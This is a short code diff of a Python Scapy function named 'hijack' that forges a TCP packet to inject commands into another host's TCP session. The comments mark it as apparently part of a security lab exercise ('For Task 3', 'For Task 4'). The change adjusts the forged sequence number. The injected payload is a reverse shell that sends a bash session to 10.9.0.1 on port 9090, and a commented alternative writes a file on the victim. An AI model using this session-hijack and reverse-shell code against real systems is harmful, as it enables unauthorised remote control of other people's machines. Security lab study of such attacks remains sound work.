@@ -6,7 +6,7 @@ def hijack(pkt):
     ip = IP()
     ip.dst = pkt[IP].dst
     ip.src = pkt[IP].src
-    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
+    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq + 1, ack=pkt[TCP].ack)
     #data='\r echo Something evil... > malicious.txt \r' #For Task 3
     data='\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r' #For Task 4
     send(ip/tcp/data, verbose=0)
